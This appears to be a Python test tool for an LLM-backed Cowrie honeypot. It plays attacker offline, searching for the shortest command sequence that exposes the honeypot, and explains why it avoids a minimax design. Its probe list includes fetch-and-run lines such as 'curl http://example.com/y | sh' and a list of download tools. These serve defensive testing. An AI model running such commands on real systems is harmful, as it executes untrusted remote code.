#!/usr/bin/env python3
# SPDX-License-Identifier: BSD-3-Clause

# ABOUTME: Plays attacker against our own honeypot offline, searching for
# ABOUTME: the shortest command sequence that proves it is fake. Drives the
# ABOUTME: real protocol — not a mirror of it — with a stubbed model and
# ABOUTME: frozen clock, so results are deterministic and reproducible.
# ABOUTME: Single-agent best-first search; see "Not minimax" below for why.

"""Adversarial probe search: find the shortest sequence that detects us.

A honeypot's whole value is not being recognised as one, and the cheapest
way to lose that is a tell nobody looked for. This searches for tells the
way an attacker would: issue commands, read the transcript, and check
whether anything a real Linux box would never do just happened.

Built because a real one shipped. `cd /tmp || cd /var/run || cd /` set the
working directory to the entire string, so the prompt read back the
attacker's own command:

    root@host:/tmp || cd /var/run || cd /#

One command, no model call, unmistakable. It sat in our own attacker_sim
corpus the whole time. attacker_sim did not catch it because it counts
events rather than judging output, and routing_report did not catch it
because it classifies anything starting with `cd` as handled-locally --
the same blind spot as the code. This tool exists so that class of miss
gets found by machine rather than by a reviewer.

NOT MINIMAX, deliberately
-------------------------
An earlier iteration of this project built a minimax planner and retired
it (tag minimax-planner-v1) after measuring that it reproduced the
existing if-ladder's decisions exactly. It would be easy to reach for the
same hammer here, framing the defender's configuration as a MIN player.
Three reasons not to, each checkable:

1. The payoff is constant along the defender axis. `_try_fastpath` runs
   first in lineReceived and consults only the two jitter integers; no
   config key disables or guards it. The detecting probe works against
   every configuration, so min-over-configs of max-over-probes is just
   max-over-probes.
2. It is not sequential. The defender picks a configuration once at
   process start, before the session exists. That is a one-shot matrix
   game, not a game tree, and alpha-beta on a tree with one real ply
   prunes nothing.
3. The MIN objective inverts. A defender minimising detectability would
   disable deterministic_responses, pipe_filters, interactive_programs and
   capture_downloads -- a honeypot that answers nothing is undetectable
   and useless. That is the same pathology that killed the planner.

So: single-agent search over probe sequences, with the configuration
dimension handled by --sweep, which is an honest `for cfg in configs`
loop. It gives a strictly stronger guarantee than a game value would, and
naming it a sweep keeps anyone from bolting alpha-beta onto it later.

What it proves, and does not
----------------------------
A clean run means no detector exists *within this probe alphabet at this
depth*. The alphabet is hand-written and inherits our blind spots, exactly
as routing_report inherited the fastpath's. Absence of a finding is not
evidence of indistinguishability.
"""

from __future__ import annotations

import argparse
import itertools
import re
import sys
import time
from contextlib import contextmanager
from dataclasses import dataclass, field
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "src"))

# ruff: noqa: E402 — must follow the sys.path insert so this runs from a
# checkout without the package installed.
from cowrie.core.config import CowrieConfig
from cowrie.llm import factkeys
from cowrie.llm import persona as personamod
from cowrie.llm import protocol as protomod
from cowrie.llm import responder as respondermod

# --------------------------------------------------------------------------
# Determinism
#
# Without all three of these the search reports noise as findings.

#: Fixed instant for the frozen clock. Any constant works; this one is
#: recognisable in output.
FROZEN_NOW = 1_700_000_000.0

#: Pinned so a session's derived values (loadavg, top percentages, ping
#: timings) are reproducible. roll_boot_time() returns time.time() - k and
#: feeds the responder seed, so without pinning these differ run to run.
PINNED_BOOT = FROZEN_NOW - (771 * 86400 + 61_860)


@contextmanager
def frozen_clock():
    """Freeze the clock the responder reads.

    uptime, w, date, /proc/uptime and top -bn1 all call time.time() or
    datetime.now() directly. They are the highest-value re-probe targets --
    FINGERPRINT_PROBE exists to exploit exactly them -- so excluding them
    from the alphabet would be worse than freezing.
    """
    real_time = respondermod.time.time
    real_datetime = respondermod.datetime

    class _FrozenDateTime(real_datetime):  # type: ignore[misc, valid-type]
        @classmethod
        def now(cls, tz=None):
            return real_datetime.fromtimestamp(FROZEN_NOW, tz)

        @classmethod
        def utcnow(cls):
            return real_datetime.utcfromtimestamp(FROZEN_NOW)

    respondermod.time.time = lambda: FROZEN_NOW
    respondermod.datetime = _FrozenDateTime
    try:
        yield
    finally:
        respondermod.time.time = real_time
        respondermod.datetime = real_datetime


#: Marker the stubbed model returns. Content is never scored -- we cannot
#: simulate what a real model would say -- but the *route* is a signal, and
#: a fixed string keeps the search deterministic.
MODEL_MARKER = "<model>"


class _RecordingStub:
    """Stands in for LLMClient. Records every call; never varies."""

    def __init__(self):
        self.calls: list = []
        self.max_tokens = 500
        self.temperature = 0.7

    def generate(self, request):
        from twisted.internet import defer

        self.calls.append(request)
        return defer.succeed(MODEL_MARKER)

    def get_response(self, prompt):
        from twisted.internet import defer

        self.calls.append(prompt)
        return defer.succeed(MODEL_MARKER)

    def supports_streaming(self) -> bool:
        return False


# --------------------------------------------------------------------------
# Session

#: A POSIX absolute path. Anything else in the prompt means the shell is
#: reporting a working directory no real shell could be in.
_ABS_PATH = re.compile(r"^/$|^(/[^/\0 \t;&|<>$`()*?\[\]]+)+$")

_FETCH_VERBS = ("wget", "curl", "tftp", "ftpget", "scp", "nc")


@dataclass
class Finding:
    signal: str
    detail: str
    probe: str


@dataclass
class Session:
    """One honeypot session under test."""

    persona_slug: str = "auto"
    proto: object = None
    transport: object = None
    stub: _RecordingStub = None
    events: list = field(default_factory=list)
    transcript: list = field(default_factory=list)

    def start(self) -> Session:
        from cowrie.test.fake_server import FakeAvatar, FakeServer
        from cowrie.test.fake_transport import FakeTransport

        CowrieConfig.set("llm", "fastpath_jitter_ms_min", "0")
        CowrieConfig.set("llm", "fastpath_jitter_ms_max", "0")
        CowrieConfig.set("llm", "stream", "false")

        self.stub = _RecordingStub()
        server = FakeServer()
        server.llm_client = self.stub
        avatar = FakeAvatar(server)
        self.proto = protomod.HoneyPotInteractiveProtocol(avatar)
        self.transport = FakeTransport("", "31337")
        self.proto.makeConnection(self.transport)
        self.proto.realClientIP = "203.0.113.45"
        # Pin persona and boot time: see PINNED_BOOT.
        if self.persona_slug != "auto":
            self.proto.persona = personamod.pick_persona(
                "203.0.113.45", override=self.persona_slug
            )
        self.proto.boot_time = PINNED_BOOT
        self.transport.clear()

        self.events = []
        original = protomod.log.msg
        protomod.log.msg = lambda *a, **k: self.events.append(k)
        self._restore_log = original
        return self

    def stop(self) -> None:
        protomod.log.msg = self._restore_log
        try:
            self.proto.setTimeout(None)
        except Exception:
            pass

    def send(self, command: str) -> str:
        self.transport.clear()
        before = len(self.stub.calls)
        try:
            self.proto.lineReceived(command.encode())
        except Exception as e:
            self.transcript.append((command, f"<raised {type(e).__name__}: {e}>"))
            return ""
        out = self.transport.value().decode("utf-8", errors="replace")
        self.transcript.append((command, out))
        self._last_hit_model = len(self.stub.calls) > before
        return out

    @property
    def state_key(self) -> tuple:
        """Canonical state, for transposition dedup.

        Path search, not set search: `cd -` reads _prev_cwd, and rm /
        pop_user are non-monotonic, so two different sequences reaching the
        same key really are interchangeable but a set abstraction would be
        wrong.
        """
        p, w = self.proto, self.proto.world
        return (
            p.cwd,
            getattr(p, "_prev_cwd", None),
            tuple(sorted(w.files)),
            tuple(sorted(w.told_facts)),
            tuple(w.user_stack),
        )


# --------------------------------------------------------------------------
# Detection signals
#
# Deliberately boolean and few. A weighted score would be optimised by the
# search in whatever direction we happened to weight it -- the same trap
# that produced a planner preferring silence.


def detect(session: Session, probe: str, output: str) -> list[Finding]:
    findings: list[Finding] = []
    proto = session.proto

    # 1. The prompt reports a working directory no shell could be in.
    #    This is the ground-truth signal: the cd fastpath writes the whole
    #    remainder of the line into cwd, and _write_prompt_safe renders it
    #    verbatim.
    #    _ABS_PATH is the whole check: it rejects any path containing a
    #    shell operator, a space, or a control character, which is exactly
    #    what "the prompt echoed the command line" looks like. An earlier
    #    version also compared cwd against the raw argument to catch
    #    "echoes input" separately; once chains were split correctly that
    #    heuristic fired on `cd /tmp && id` — where cwd=/tmp is right — so
    #    it was pure false-positive surface and is gone. Keep the signals
    #    few and boolean; a detector that cries wolf gets muted.
    if not _ABS_PATH.match(proto.cwd):
        findings.append(
            Finding("prompt-corruption", f"cwd={proto.cwd!r} is not a POSIX path", probe)
        )

    # 2. A fetch command produced no fetch. capture_downloads is on by
    #    default, so a wget/curl that reaches neither the interceptor nor
    #    the model has been silently swallowed -- and with it, the payload
    #    we exist to capture.
    verb = probe.strip().split()[0] if probe.strip() else ""
    if any(f in probe for f in _FETCH_VERBS) and verb not in _FETCH_VERBS:
        # The interceptor is asynchronous, so offline nothing completes —
        # look for the *attempt* event, not the download outcome.
        touched = getattr(session, "_last_hit_model", False) or any(
            e.get("eventid") in (
                "cowrie.llm.download_intercept",
                "cowrie.llm.deterministic",
            )
            or e.get("eventid", "").startswith("cowrie.session.file")
            for e in session.events[-6:]
        )
        if not touched:
            findings.append(
                Finding(
                    "dropped-command",
                    f"line contains a fetch but nothing handled it: {probe!r}",
                    probe,
                )
            )

    # 3. We contradicted ourselves about a fact we already stated.
    #    told_facts is the honeypot's own record of what it committed to,
    #    so this needs no external oracle.
    key = factkeys.fact_family(probe)
    if key:
        claim = proto.world.told_facts.get(key)
        # Compare per COMMAND, not per family. `whoami` and `id` report
        # the same fact in different shapes; that is not a contradiction,
        # it is two renderings. Only the identical command giving a
        # different answer within one session is unambiguous drift.
        prior = getattr(session, "_claims", {})
        normalized = " ".join(probe.split())
        if claim:
            if normalized in prior and prior[normalized] != claim.excerpt:
                findings.append(
                    Finding(
                        "self-contradiction",
                        f"{normalized!r}: {prior[normalized][:36]!r} "
                        f"then {claim.excerpt[:36]!r}",
                        probe,
                    )
                )
            prior[normalized] = claim.excerpt
            session._claims = prior

    return findings


# --------------------------------------------------------------------------
# Probe alphabet


def build_alphabet() -> list[str]:
    """~32 probes, each justified by an existing oracle or code branch.

    The first family is the important one: no other tool in this repo
    covers fastpath verbs carrying shell operators, which is precisely
    where the known bug lives.
    """
    fastpath_verbs = ("cd", "pwd", "clear", "exit")
    operators = ("&& id", "|| id", "; id")
    operator_probes = [
        f"{v} /tmp {op}" if v == "cd" else f"{v} {op}"
        for v, op in itertools.product(fastpath_verbs, operators)
    ]
    operator_probes += [
        "cd /tmp || cd /var/run || cd /",
        "cd /tmp && wget http://example.com/x.sh",
        "cd /tmp; curl http://example.com/y | sh",
    ]

    reprobes = [
        "uname -a", "uname -r", "cat /proc/version",
        "free -m", "cat /proc/meminfo",
        "cat /etc/os-release", "lsb_release -a",
        "id", "whoami",
        "uptime", "cat /proc/uptime",
        "nproc", "cat /proc/cpuinfo",
    ]
    mutators = ["touch /tmp/m", "echo d > /tmp/m", "ls -la /tmp", "stat /tmp/m"]
    pipes = ["free -m | head -2", "ls /etc | wc -l"]

    return operator_probes + reprobes + mutators + pipes


# --------------------------------------------------------------------------
# Search


def search(
    alphabet: list[str], max_depth: int, persona: str = "auto"
) -> tuple[list[str], list[Finding], int]:
    """Iterative deepening: return the SHORTEST detecting sequence.

    Depth-first within each level, rebuilding a session per path. That is
    O(paths) rather than O(nodes), which would matter at depth 4+ -- but a
    honeypot with a depth-3 detector has a problem worth fixing before
    anyone optimises the search.
    """
    nodes = 0
    for depth in range(1, max_depth + 1):
        seen: set = set()
        for path in itertools.product(alphabet, repeat=depth):
            nodes += 1
            session = Session(persona_slug=persona).start()
            try:
                findings: list[Finding] = []
                for probe in path:
                    out = session.send(probe)
                    findings = detect(session, probe, out)
                    if findings:
                        return list(path[: path.index(probe) + 1]), findings, nodes
                key = session.state_key
                if key in seen:
                    continue
                seen.add(key)
            finally:
                session.stop()
    return [], [], nodes


#: Behaviour toggles that actually change attacker-visible output offline.
#: jitter is excluded: it delays the prompt without changing a byte.
_TOGGLES = (
    "deterministic_responses",
    "pipe_filters",
    "interactive_programs",
    "capture_downloads",
)


def sweep(alphabet: list[str], max_depth: int) -> list[tuple]:
    """Run the search across every configuration that changes behaviour.

    This is the honest form of "min over defensive configurations": a
    loop, not a game. It yields a strictly stronger guarantee than a
    minimax value -- every configuration is checked, rather than one being
    assumed optimal.
    """
    results = []
    personas = [p.slug for p in personamod.PERSONAS]
    for persona in personas:
        for combo in itertools.product((True, False), repeat=len(_TOGGLES)):
            for name, value in zip(_TOGGLES, combo, strict=True):
                CowrieConfig.set("llm", name, "true" if value else "false")
            path, findings, _ = search(alphabet, max_depth, persona)
            results.append(
                (persona, dict(zip(_TOGGLES, combo, strict=True)), path, findings)
            )
    for name in _TOGGLES:
        CowrieConfig.remove_option("llm", name)
    return results


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Search for the shortest command sequence that detects the honeypot."
    )
    parser.add_argument("--max-depth", type=int, default=2)
    parser.add_argument("--persona", default="auto")
    parser.add_argument(
        "--sweep", action="store_true", help="run across all behaviour configurations"
    )
    parser.add_argument(
        "--min-depth",
        type=int,
        default=99,
        help="fail if a detecting sequence shorter than this exists (default 99)",
    )
    args = parser.parse_args()

    alphabet = build_alphabet()
    print(f"probe alphabet: {len(alphabet)} commands, max depth {args.max_depth}")

    with frozen_clock():
        if args.sweep:
            results = sweep(alphabet, args.max_depth)
            detected = [r for r in results if r[3]]
            print(f"\nconfigurations tested: {len(results)}")
            print(f"configurations detected: {len(detected)}")
            for persona, toggles, path, findings in detected[:10]:
                on = ",".join(k for k, v in toggles.items() if v) or "all-off"
                print(f"  {persona:<14} [{on}]")
                print(f"      {findings[0].signal}: {' ; '.join(path)}")
            if detected:
                print(
                    f"\nFAIL: {len(detected)}/{len(results)} configurations are "
                    "detectable within the search depth.",
                    file=sys.stderr,
                )
                return 1
            print("\nOK: no configuration detected within the search depth.")
            return 0

        started = time.time()
        path, findings, nodes = search(alphabet, args.max_depth, args.persona)
        elapsed = time.time() - started

    print(f"sequences tried: {nodes} in {elapsed:.1f}s")
    if not findings:
        print(f"\nOK: no detecting sequence found at depth <= {args.max_depth}.")
        print("     (means none exists in THIS alphabet at THIS depth — not that")
        print("      the honeypot is indistinguishable.)")
        return 0

    print(f"\nDETECTED in {len(path)} command(s):\n")
    for i, probe in enumerate(path, 1):
        print(f"  {i}. $ {probe}")
    print()
    for f in findings:
        print(f"  signal : {f.signal}")
        print(f"  detail : {f.detail}")

    if len(path) < args.min_depth:
        print(
            f"\nFAIL: detectable in {len(path)} command(s), "
            f"threshold is {args.min_depth}.",
            file=sys.stderr,
        )
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
